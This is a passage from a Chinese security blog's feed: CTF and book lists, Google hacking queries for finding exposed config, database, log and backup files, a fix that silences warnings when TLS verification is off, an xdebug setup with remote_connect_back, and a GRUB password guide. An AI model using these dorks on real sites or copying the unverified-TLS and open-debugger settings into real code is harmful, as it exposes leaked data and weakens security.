    <content type="html"><![CDATA[<h2 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h2><p>CTF（Capture The Flag，夺旗赛）起源于 1996 年 DEFCON 全球黑客大会，是网络安全爱好者之间的竞技游戏。</p><p>CTF 竞赛涉及众多领域，内容繁杂。目前，安全技术发展地越来越快，CTF 题目的难度越来越高,这里我会总结一些常用的工具、靶场及站点，供大家参考。</p><h1 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h1><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF Wiki</a></li><li><a href="https://github.com/Hack-with-Github/Awesome-Hacking">Awesome Hacking</a></li><li><a href="https://github.com/enaqx/awesome-pentest">Awesome Pentest</a></li><li><a href="https://github.com/apsdehal/awesome-ctf">Awesome CTF</a></li><li><a href="https://github.com/p4-team/ctf">Ctf solutions from p4 team</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html">知道创宇研发技能表 v3.1</a></li><li><a href="https://skills.bugbank.cn/">漏洞银行(BUGBANK)技能树</a></li><li><a href="https://evilcos.me/security_skill_tree_basic/index.html">安全技能树简版 by 余弦</a></li><li><a href="https://github.com/phith0n/Mind-Map">安全类思维导图 by phith0n</a></li></ul><h1 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a>CTF平台</h1><ul><li><a href="http://ctf.bugku.com/">BugKu CTF</a></li><li><a href="https://github.com/ctfs">github Ctfs</a></li><li><a href="http://www.wechall.net/">Wechall</a></li><li><a href="https://exploit-exercises.com/protostar/">Protostar</a></li><li><a href="https://exploit-exercises.com/protostar/">XCTF</a></li><li><a href="https://www.ichunqiu.com/competition">IChunQiu CTF</a></li><li><a href="https://pwnhub.cn/index">Pwnhub</a></li><li><a href="http://ctf.nuptsast.com/">南京邮电大学网络攻防平台</a></li><li><a href="http://hackinglab.cn/">HackingLab 网络信息安全攻防学习平台</a></li><li><a href="https://www.jarvisoj.com/">Jarvis</a></li><li><a href="https://ctflearn.com/">Ctf Learn</a></li></ul><h1 id="CTF在线工具"><a href="#CTF在线工具" class="headerlink" title="CTF在线工具"></a>CTF在线工具</h1><ul><li><a href="https://www.ctftools.com/down/">CTF Tools</a></li><li><a href="http://ctf.ssleye.com/">CTF 编码</a></li><li><a href="http://tool.bugku.com/">BugKu 在线工具箱</a></li><li><a href="https://github.com/zardus/ctf-tools">ctf-tools github</a></li></ul><h1 id="CTF离线工具"><a href="#CTF离线工具" class="headerlink" title="CTF离线工具"></a>CTF离线工具</h1><ul><li><a href="https://tools.pediy.com/">看雪工具</a></li></ul><h1 id="安全靶场"><a href="#安全靶场" class="headerlink" title="安全靶场"></a>安全靶场</h1><ul><li><a href="https://www.vulnhub.com/">vulnhub</a></li></ul><h1 id="离线学习平台"><a href="#离线学习平台" class="headerlink" title="离线学习平台"></a>离线学习平台</h1><ul><li><a href="https://vulhub.org/">vulnhub docker</a></li><li><a href="http://vulapps.evalbug.com/">vulapps</a></li><li><a href="https://hub.docker.com/r/kalilinux/kali-linux-docker/">official Kali Linux</a></li><li><a href="https://github.com/zaproxy/zaproxy">official OWASP ZAP</a></li><li><a href="https://hub.docker.com/r/wpscanteam/wpscan/">official WPScan</a></li><li><a href="https://hub.docker.com/r/citizenstig/dvwa/">Damn Vulnerable Web Application (DVWA)</a></li><li><a href="https://hub.docker.com/r/wpscanteam/vulnerablewordpress/">Vulnerable WordPress Installation</a></li><li><a href="https://hub.docker.com/r/opendns/security-ninjas/">Security Ninjas</a></li><li><a href="https://hub.docker.com/r/diogomonica/docker-bench-security/">Docker Bench for Security</a></li><li><a href="https://hub.docker.com/r/ismisepaul/securityshepherd/">OWASP Security Shepherd</a></li><li><a href="https://hub.docker.com/r/danmx/docker-owasp-webgoat/">OWASP WebGoat Project docker image</a></li><li><a href="https://hub.docker.com/r/citizenstig/nowasp/">OWASP Mutillidae II Web Pen-Test Practice Application</a></li></ul><p>离线平台docker资源链接参考<a href="https://github.com/infoslack/awesome-web-hacking">awesome-web-hacking</a></p><hr><p>附：有什么问题请及时联系本人，本人CTF新人，多谢关照。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全从业者书单推荐</title>
    <link href="/2018/07/19/2018-07-19-Security-worker-books-lists/"/>
    <url>/2018/07/19/2018-07-19-Security-worker-books-lists/</url>
    
    <content type="html"><![CDATA[<h1 id="信息安全新人阅读书籍"><a href="#信息安全新人阅读书籍" class="headerlink" title="信息安全新人阅读书籍"></a>信息安全新人阅读书籍</h1><hr><p>我们在学习信安的途中会阅读很多书籍，其中书籍的质量层次不齐，前几天看泉哥（riusksk）的博客，看到他写了一个信息安全从业者书单推荐，下面是github链接<a href="">https://github.com/riusksk/secbook</a></p><p><img src="/img/Security-worker-books-lists-by-riusksk.jpg"></p><p>以下书籍列表是基于泉哥推荐书籍列表汇总的，不定期进行更新</p><h1 id="计算机及系统原理"><a href="#计算机及系统原理" class="headerlink" title="计算机及系统原理"></a>计算机及系统原理</h1><p>· 《编码：隐匿在计算机软硬件背后的语言》 【美】Charles Petzold</p><p>· 《深入理解计算机系统》【美】Randal E.Bryant</p><p>· 《深入理解Windows操作系统》【美】Russinovich,M.E.；Solomon,D.A.</p><p>· 《Linux内核设计与实现》【美】Robert Love</p><p>· 《深入理解Android内核设计思想》林学森</p><p>· 《Android系统源代码情景分析》罗升阳</p><p>· 《深入理解Mac OS X &amp; iOS操作系统》【美】Jonathan Levin</p><p>· 《深入理解Linux内核》 【美】DanielP.Bovet</p><p>· 《代码揭秘：从C&#x2F;C++的角度探秘计算机系统》左飞</p><p>· 《Android Dalvik虚拟机结构及机制剖析（第1、2卷）》吴艳霞；张国印</p><p>· 《Android Internals::Power User’s View》【美】Jonathan Levin，中文书名《最强Android书：架构大剖析》已上架</p><h1 id="编程开发"><a href="#编程开发" class="headerlink" title="编程开发"></a>编程开发</h1><h2 id="系统平台"><a href="#系统平台" class="headerlink" title="系统平台"></a>系统平台</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>· 《Windows程序设计》【美】Charles Petzold</p><p>· 《Windows核心编程》【美】Jeffrey Richter</p><p>· 《Windows环境下32位汇编语言程序设计》罗云彬</p><p>· 《Windows驱动开发技术详解》张帆</p><h3 id="Linux-x2F-Unix"><a href="#Linux-x2F-Unix" class="headerlink" title="Linux&#x2F;Unix"></a>Linux&#x2F;Unix</h3><p>· 《UNIX环境高级编程》【美】W.Richard Stevens；Stephen A.Rago</p><p>· 《Linux程序设计》【美】Neil Matthew；Richard Stones</p><p>· 《鸟哥的Linux私房菜》鸟哥</p><p>· 《Linux设备驱动程序》【美】Jonathan Corbet；Alessandro Rubini；Gerg Kroah-Hartman</p><h3 id="MAC-OS-x2F-iOS"><a href="#MAC-OS-x2F-iOS" class="headerlink" title="MAC OS&#x2F;iOS"></a>MAC OS&#x2F;iOS</h3><p>· 《iOS编程》【美】Christian Keur；Aaron Hillegass</p><p>· 《OS X与iOS内核编程）【澳】Halvorsen,O.H.；Clarke,D</p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>· 《第一行代码——Android》郭霖</p><p>· 《Android编程权威指南》【美】Brian Hardy；BillPhillips</p><h2 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>· 《C语言程序设计》【美】Brian W.Kernighan；Dennis M.Ritchie</p><p>· 《C Primer Plus》【美】Stephen Prata，入门书籍</p><p>· 《C和指针》【美】Kenneth A.Reek</p><p>· 《C陷阱与缺陷》【美】Andrew Koenig</p><p>· 《C专家编程》【美】Peter van der Linden</p><h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><p>· 《C++ Primer Plus》【美】Stephen Prata，入门书籍</p><p>· 《C++ Primer》【美】Stanley B.Lippman；Josée Lajoie；Barbara E.Moo，进阶书籍</p><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>· 《Intel汇编语言程序设计》【美】Kip Irvine</p><p>· 《Intel开发手册》</p><p>· 《汇编语言（第3版）》王爽</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>· 《Java核心技术》【美】Cay S.Horstmann；Gary Cornell，入门书籍</p><p>· 《Java 编程思想》【美】Bruce eckel，进阶书籍</p><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>· 《JavaScript DOM编程艺术》【美】Jeremy Keith；【加】Jeffrey Sambells</p><p>· 《JavaScript高级程序设计》【美】Zakas.Bicholas C.</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>· 《Python核心编程（第2版）》【美】Wesley J·Chun</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>· 《Linux Shell脚本攻略》【印】Sarath Lakshman</p><h2 id="调试技术"><a href="#调试技术" class="headerlink" title="调试技术"></a>调试技术</h2><p>· 《软件调试》张银奎</p><p>· 《Debug Hacks》【日】吉冈弘隆；大和一洋；大岩尚宏；安部东洋；吉田俊辅</p><p>· 《格蠹汇编：软件调试案例锦集》张银奎</p><h2 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h2><p>· 《数据结构与算法分析——C语言描述》【美】Mark Allen Weiss</p><p>· 《算法导论》【美】Thomas H.Cormen；Chales E.Leiserson；Ronald l.Rivest</p><h2 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h2><p>· 《编译系统透视：图解编译原理》新设计团队，入门书籍</p><p>· 《编译原理》（龙书）【美】Alfered V.Aho；Monica S.Lam；Ravi Sehi；Jeffrey D.Ullmam</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>· 《编程高手箴言》梁肇新</p><p>· 《代码整洁之道》【美】Robert C.Martin</p><p>· 《代码大全》【美】Steve McConnell</p><h1 id="网络技术"><a href="#网络技术" class="headerlink" title="网络技术"></a>网络技术</h1><p>· 《TCP&#x2F;IP详解（卷1：协议）》【美】Kevin R.fall；W.Richard Stevens</p><p>· 《Wireshark数据包分析实战》【美】Chris Sanders</p><h1 id="安全技术"><a href="#安全技术" class="headerlink" title="安全技术"></a>安全技术</h1><h2 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a>安全开发</h2><p>· 《天书夜读：从汇编语言到Windows内核编程》谭文；邵坚磊</p><p>· 《Rootkit：系统灰色地带的潜伏者》【美】Bill Blunden</p><p>· 《Rootkits——Windows内核的安全防护》【美】Gerg Hoglund；James Butler</p><p>· 《BSD ROOTKIT设计——内核黑客指引书》【美】Joseph Kong</p><p>· 《寒江独钓：Windows内核安全编程》谭文；杨潇；邵坚磊</p><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><p>· 《恶意软件分析诀窍与工具箱——对抗“流氓”软件的技术与利器》【美】Michael Hale Ligh；Steven Adair</p><p>· 《C++反汇编与逆向分析技术揭秘》钱林松；赵海旭</p><p>· 《IDA权威指南》【美】Chris Eagle</p><p>· 《逆向工程权威指南》【乌克兰】Dennis Yurichev，多平台入门大全</p><p>· 《Android软件安全与逆向分析》丰生强</p><p>· 《macOS软件安全与逆向分析》丰生强</p><p>· 《iOS应用逆向工程（第2版）》沙梓社；吴航</p><h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p>· 《黑客攻防技术宝典：Web实战篇》【美】Marcus Pinto，Dafydd Stuttard</p><p>· 《白帽子讲Web安全》吴翰清</p><p>· 《Web安全测试》【美】Paco Hope；Ben Waltber</p><p>· 《Web前端黑客技术揭秘》钟晨鸣；徐少培</p><p>· 《精通脚本黑客》曾云好</p><h2 id="软件-x2F-系统安全"><a href="#软件-x2F-系统安全" class="headerlink" title="软件&#x2F;系统安全"></a>软件&#x2F;系统安全</h2><p>· 《0day安全：软件漏洞分析技术（第2版）》王清，入门书籍</p><p>· 《漏洞战争：软件漏洞分析精要》林桠泉，进阶书籍</p><p>· 《捉虫日记》【德】Tobias Klein，进阶书籍</p><p>· 《黑客防线2009缓冲区溢出攻击与防范专辑》</p><p>· 《内核漏洞的利用与防范》【美】Enrico Perla；Massimiliano Oldani</p><p>· 《Fuzzing for Software Security Testing and Quality Assurance（第2版）》【美】Charlie Miller，博文视点翻译中</p><p>· 《iOS Hackers’s Handbook》【美】Charlie Miller，不推荐中文版</p><p>· 《The Mac Hacker’s Handbook》【美】Charlie Miller</p><p>· 《Android安全攻防权威指南》【美】Joshua J.Drake；【西】Pau Oliva Fora；【美】Collin Mulliner</p><p>· 《The Art of Softwar Security Assessment:Identifying and Preventing Software Vulnerabilities》【美】Mark Dowd</p><p>· 《Android安全攻防实战》【美】Keith Makan；Scott Alexander-Bow</p><p>· 《模糊测试-强制性安全漏洞挖掘》【美】Michael Mutton</p><p>· 《Exploit编写系列教程》【美】Corelan Team</p><p>· 《MacOS and iOS Internals,Volume Ⅲ: Security &amp; Insecurity》【美】Jonathan Levin，博文视点翻译中，预计今年上市</p><p>· 《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》【美】Allen Harper；Shon harris</p><p>· 《威胁建模：设计和交付更安全的软件》【美】Adam Shostack</p><h2 id="无线电安全"><a href="#无线电安全" class="headerlink" title="无线电安全"></a>无线电安全</h2><p>· 《无线电安全攻防大揭秘》杨卿；黄琳</p><h2 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h2><p>· 《硬件安全攻防大揭秘》简云定，杨卿</p><h2 id="汽车安全"><a href="#汽车安全" class="headerlink" title="汽车安全"></a>汽车安全</h2><p>· 《智能汽车安全攻防大揭秘》李均；杨卿</p><p>· 《汽车黑客大曝光》【美】Craig Smith</p><h1 id="软技能"><a href="#软技能" class="headerlink" title="软技能"></a>软技能</h1><p>· 《软技能：代码之外的生存指南》【美】John Sonmez</p><p>· 《程序员健康指南》【美】JoeKutner</p><p>· 《影响力》【美】Robert B.Cialdini</p><p>· 《穷爸爸富爸爸》【美】Robert Toru Kiyosaki</p><p>· 《写给大家看的设计书》【美】Robin Williams</p><p>· 《听故事，学PPT设计》杨雪</p><p>· 《横向领导力》【美】Roger Fisher；Alan Sharpe</p><p>· 《职业情商》张新越</p><p>· 《程序员的成长课》安晓辉；周鹏</p><p>· 《高效演讲：斯坦福最受欢迎的沟通课》【美】Peter Meyers；Shann Nix</p><p>· 《程序员的英语》【韩】朴栽浒；李海永</p><p>· 《思考，快与慢》【美】丹尼尔·卡尼曼</p><p>· 《少有人走的路》【美】斯科特·派克</p><p>· 《异类：不一样的成功启示录》【加】 马尔科姆·格拉德威尔 </p><p>· 《见识》吴军</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Books</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全开发之安全开发框架</title>
    <link href="/2018/07/12/2018-07-12-security-development-framework/"/>
    <url>/2018/07/12/2018-07-12-security-development-framework/</url>
    
    <content type="html"><![CDATA[<p>在软件开发的过程中，系统设计和开发人员必须要面对一系列复杂的安全问题，如果在系统正式上线之前就做好安全风险防范，越早考虑到安全问题，那么需要解决问题所需要的<br>成本就越低。当应用系统部署完成以后，修复漏洞的成不很高，可能会影响到业务能力。</p><p>通过对常见的应用漏洞进行分析研究，给出规避安全漏洞的建议和要求，根本上解决应用系统的安全漏洞，通过规范安全编码，开发人员可以养成良好编程的习惯，这样可以提高<br>系统的安全性和健壮性，保障业务顺利进行。</p><h1 id="安全编码准则"><a href="#安全编码准则" class="headerlink" title="安全编码准则"></a>安全编码准则</h1><h2 id="输入的数据均有害"><a href="#输入的数据均有害" class="headerlink" title="输入的数据均有害"></a>输入的数据均有害</h2><h2 id="最小化原则"><a href="#最小化原则" class="headerlink" title="最小化原则"></a>最小化原则</h2><h2 id="不依赖运行环境的安全配置"><a href="#不依赖运行环境的安全配置" class="headerlink" title="不依赖运行环境的安全配置"></a>不依赖运行环境的安全配置</h2><h2 id="失败终止原则"><a href="#失败终止原则" class="headerlink" title="失败终止原则"></a>失败终止原则</h2><h2 id="安全控制措施落实在最后阶段"><a href="#安全控制措施落实在最后阶段" class="headerlink" title="安全控制措施落实在最后阶段"></a>安全控制措施落实在最后阶段</h2><h2 id="简单原则"><a href="#简单原则" class="headerlink" title="简单原则"></a>简单原则</h2><h1 id="常见安全开发框架"><a href="#常见安全开发框架" class="headerlink" title="常见安全开发框架"></a>常见安全开发框架</h1><h2 id="spring-security"><a href="#spring-security" class="headerlink" title="spring security"></a>spring security</h2><p>spring security相关站点：</p><ul><li><a href="https://spring.io/projects/spring-security">spring security官网</a></li><li><a href="https://vincentmi.gitbooks.io/spring-security--reference-zh/content/1_introduction.html">spring security中文介绍</a> </li><li><a href="http://blog.didispace.com/springbootsecurity/">Spring Boot中使用Spring Security进行安全控制</a></li><li><a href="https://blog.csdn.net/u012702547/article/details/54319508">在Spring Boot中使用Spring Security实现权限控制</a></li><li><a href="https://blog.csdn.net/bao19901210/article/details/52574340">spring security四种实现方式</a></li></ul><h2 id="apache-shiro"><a href="#apache-shiro" class="headerlink" title="apache shiro"></a>apache shiro</h2><h2 id="HDIV"><a href="#HDIV" class="headerlink" title="HDIV"></a>HDIV</h2><h2 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a>DevSecOps</h2>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>google hacking web常用语法收集</title>
    <link href="/2018/05/28/2018-05-28-google-hacking-usual-statement/"/>
    <url>/2018/05/28/2018-05-28-google-hacking-usual-statement/</url>
    
    <content type="html"><![CDATA[<h1 id="google-hacking-web常用语法收集"><a href="#google-hacking-web常用语法收集" class="headerlink" title="google hacking web常用语法收集"></a>google hacking web常用语法收集</h1><hr><h1 id="谷歌hacking语法常用信息收集"><a href="#谷歌hacking语法常用信息收集" class="headerlink" title="谷歌hacking语法常用信息收集"></a>谷歌hacking语法常用信息收集</h1><h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>语法为: site:域名 intitle:index.of</p><h2 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h2><p>语法为: site:域名 ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini</p><h2 id="数据库文件泄露"><a href="#数据库文件泄露" class="headerlink" title="数据库文件泄露"></a>数据库文件泄露</h2><p>site:域名 ext:sql | ext:dbf | ext:mdb</p><h2 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h2><p>site:域名 ext:log</p><h2 id="备份和历史文件"><a href="#备份和历史文件" class="headerlink" title="备份和历史文件"></a>备份和历史文件</h2><p>site:域名 ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup</p><h2 id="SQL错误"><a href="#SQL错误" class="headerlink" title="SQL错误"></a>SQL错误</h2><p>site:域名 intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</p><h2 id="公开文件信息"><a href="#公开文件信息" class="headerlink" title="公开文件信息"></a>公开文件信息</h2><p>site:域名 ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:xml</p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><p>site:域名 ext:php intitle:phpinfo “published by the PHP Group”</p><hr><p>以上仅仅是自己学习总结的资料，有什么不足请及时联系本人，欢迎一起交流。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Php</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Google</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决Python3 控制台输出InsecureRequestWarning的问题</title>
    <link href="/2018/05/28/2018-05-28-terminal-output-InsecureRequestWarning/"/>
    <url>/2018/05/28/2018-05-28-terminal-output-InsecureRequestWarning/</url>
    
    <content type="html"><![CDATA[<h1 id="google-hacking-web常用语法收集"><a href="#google-hacking-web常用语法收集" class="headerlink" title="google hacking web常用语法收集"></a>google hacking web常用语法收集</h1><hr><h2 id="解决Python3-控制台输出InsecureRequestWarning的问题"><a href="#解决Python3-控制台输出InsecureRequestWarning的问题" class="headerlink" title="解决Python3 控制台输出InsecureRequestWarning的问题"></a>解决Python3 控制台输出InsecureRequestWarning的问题</h2><p>问题：</p><p>使用Python3 requests发送HTTPS请求，已经关闭认证（verify&#x3D;False）情况下，控制台会输出以下错误：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">InsecureRequestWarning: Unverified HTTPS request <span class="hljs-keyword">is</span> being made. Adding certificate verification <span class="hljs-keyword">is</span> strongly advised. See: https:<span class="hljs-comment">//urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</span><br></code></pre></td></tr></table></figure><p>解决方法：</p><p>在代码中添加以下代码即可解决：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-title">urllib3</span>.disable_warnings(urllib3.exceptions.<span class="hljs-type">InsecureRequestWarning</span>)<br></code></pre></td></tr></table></figure><p>Python2添加如下代码即可解决：</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><span class="hljs-comment"># 禁用安全请求警告</span><br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br></code></pre></td></tr></table></figure><p>摘自：（<a href="https://www.cnblogs.com/ernana/p/8601789.html%EF%BC%89">https://www.cnblogs.com/ernana/p/8601789.html）</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu 安装php7.0 xdebug</title>
    <link href="/2018/05/18/2018-05-18-php-install-xdebug/"/>
    <url>/2018/05/18/2018-05-18-php-install-xdebug/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-安装php-xdebug"><a href="#ubuntu-安装php-xdebug" class="headerlink" title="ubuntu 安装php xdebug"></a>ubuntu 安装php xdebug</h1><hr><p>环境:ubuntu 17.04<br>php:7.0<br>xdebug:2.7.0<br>官方指导教程:(<a href="https://xdebug.org/wizard.php">https://xdebug.org/wizard.php</a>)</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>(xdebug 官网<a href="https://xdebug.org/">https://xdebug.org/</a>)<br>需要下载xdebug进行编译安装</p><pre><code>$ https://xdebug.org/files/xdebug-2.7.0alpha1.tgz#我这里下载的是2.7.0版本,可视情况下载</code></pre><p>解压文件</p><pre><code>$ tar -zxvf xdebug-2.7.0alpha1.tgz </code></pre><p>使用phpize进行编译(在xdebug目录下执行)</p><pre><code>$ phpize# 如果没有phpize,请安装php7.0-dev$ ./configure --enable-xdebug $ make$ sudo make install</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>官方给出的配置信息太模糊,需要根据实际情况进行配置<br>不要编辑<code> /etc/php/7.0/cli/php.ini</code>和添加 <code>zend_extension = /usr/lib/php/20151012/xdebug.so</code></p><p>创建xdebug.ini</p><pre><code>$sudo vim /etc/php/7.0/mods-available/xdebug.ini</code></pre><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so<br> <br><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.remote_connect_back</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.remote_port</span> = <span class="hljs-number">9000</span><br><span class="hljs-attr">xdebug.scream</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.show_local_vars</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.idekey</span>=netbeans-xdebug<br> <br><span class="hljs-comment">;To remove limits for xdebug_var_dump()</span><br> <br><span class="hljs-comment">;xdebug.var_display_max_depth = 5</span><br><span class="hljs-comment">;xdebug.var_display_max_children = 256</span><br><span class="hljs-comment">;xdebug.var_display_max_data = 1024 </span><br> <br><span class="hljs-attr">xdebug.var_display_max_depth</span> = -<span class="hljs-number">1</span> <br><span class="hljs-attr">xdebug.var_display_max_children</span> = -<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.var_display_max_data</span> = -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>启用xdebug</p><pre><code>$sudo phpenmod xdebug</code></pre><p>如果你使用composer,或许需要禁用xdebug在cli下:</p><pre><code>sudo phpdismod -s cli xdebug</code></pre>]]></content>
    
    
    <categories>
      
      <category>Code</category>
      
      <category>Php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何为GRUP系统引导管理器添加密码</title>
    <link href="/2018/05/15/2018-05-15-add-grub-password/"/>
    <url>/2018/05/15/2018-05-15-add-grub-password/</url>
    
    <content type="html"><![CDATA[<h2 id="如何为GRUB系统引导管理器加上密码摘要：本文主要是讲述就如何为GRUB系统引导管理器加上密码，只要输入密码才能使用GRUB来引导系统；仅限于桌面系统上的应用，不能用-于远程管理的服务器上；我们总不会为了系统安全，重启服务器后，要跑到机房输入GRUB的密码吧；GRUB有两种加密方法，一种是明口令，另一种是md5-口令加密；"><a href="#如何为GRUB系统引导管理器加上密码摘要：本文主要是讲述就如何为GRUB系统引导管理器加上密码，只要输入密码才能使用GRUB来引导系统；仅限于桌面系统上的应用，不能用-于远程管理的服务器上；我们总不会为了系统安全，重启服务器后，要跑到机房输入GRUB的密码吧；GRUB有两种加密方法，一种是明口令，另一种是md5-口令加密；" class="headerlink" title="如何为GRUB系统引导管理器加上密码摘要：本文主要是讲述就如何为GRUB系统引导管理器加上密码，只要输入密码才能使用GRUB来引导系统；仅限于桌面系统上的应用，不能用 于远程管理的服务器上；我们总不会为了系统安全，重启服务器后，要跑到机房输入GRUB的密码吧；GRUB有两种加密方法，一种是明口令，另一种是md5 口令加密；"></a>如何为GRUB系统引导管理器加上密码<br>摘要：本文主要是讲述就如何为GRUB系统引导管理器加上密码，只要输入密码才能使用GRUB来引导系统；仅限于桌面系统上的应用，不能用 于远程管理的服务器上；我们总不会为了系统安全，重启服务器后，要跑到机房输入GRUB的密码吧；GRUB有两种加密方法，一种是明口令，另一种是md5 口令加密；</h2><h2 id="一、GRUB-明口令加密；"><a href="#一、GRUB-明口令加密；" class="headerlink" title="一、GRUB 明口令加密；"></a>一、GRUB 明口令加密；</h2><p>比如我没有设置密码之前&#x2F;etc&#x2F;grub是如下的样子：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">10</span><br><span class="hljs-attribute">splashimage</span>=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gz<br><span class="hljs-attribute">title</span> Fedora Core (<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl)<br><span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">7</span>)<br><span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl ro root=LABEL=/<br><span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">22</span>-<span class="hljs-number">1</span>.<span class="hljs-number">2061</span>.nptl.img<br><span class="hljs-attribute">title</span> WindowsXP<br><span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">0</span>)<br><span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>加入以后就是下面这样的：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 